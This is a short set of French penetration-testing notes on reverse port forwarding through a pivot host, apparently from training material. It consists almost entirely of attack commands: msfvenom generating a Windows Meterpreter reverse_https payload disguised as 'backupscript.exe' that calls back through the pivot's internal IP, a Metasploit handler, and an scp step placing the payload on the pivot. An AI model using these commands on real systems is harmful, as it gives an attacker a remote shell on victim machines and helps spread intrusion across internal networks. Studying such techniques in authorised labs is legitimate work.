# Remote/Reverse port forwarding

Permet à un host sur un réseau interne de se connecter à notre pc attaquant, via un pivot entre les deux.

```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
```

```shell-session
use exploit/multi/handler
```

transférer sur le pivot:

```shell-session
scp backupscript.exe ubuntu@<ipAddressofTarget>:~/
```

